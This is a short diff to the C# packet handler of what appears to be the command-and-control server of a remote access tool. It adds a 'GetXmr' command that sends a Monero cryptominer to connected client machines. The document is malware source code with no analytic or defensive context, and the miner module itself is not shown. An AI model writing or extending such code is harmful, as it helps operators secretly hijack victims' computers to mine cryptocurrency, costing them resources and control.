@@ -3,6 +3,9 @@ using Server.MessagePack;
 using System.Drawing;
 using System.Windows.Forms;
 using System.Threading;
+using Server.Algorithm;
+using System.IO;
+using System.Diagnostics;
 
 namespace Server.Handle_Packet
 {
@@ -170,6 +173,12 @@ namespace Server.Handle_Packet
                         case "sendPlugin+":
                             {
                                 client.ReSendPAlllugins();
+                                break;
+                            }
+
+                        case "GetXmr":
+                            {
+                                new HandleMiner().SendMiner(client);
                                 break;
                             }
                     }
